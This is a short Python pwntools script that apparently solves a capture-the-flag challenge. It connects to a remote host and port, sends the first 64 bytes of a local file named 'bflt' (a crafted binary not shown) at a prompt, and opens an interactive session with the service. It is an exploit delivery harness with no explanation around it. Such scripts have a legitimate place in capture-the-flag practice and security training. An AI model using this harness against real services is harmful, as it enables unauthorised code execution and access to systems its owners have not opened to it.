from pwn import *

if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
    #p = remote("localhost", 13370)

bin = open("bflt", "rb").read()[:64]
p.sendafter(b":", bin)

p.interactive()
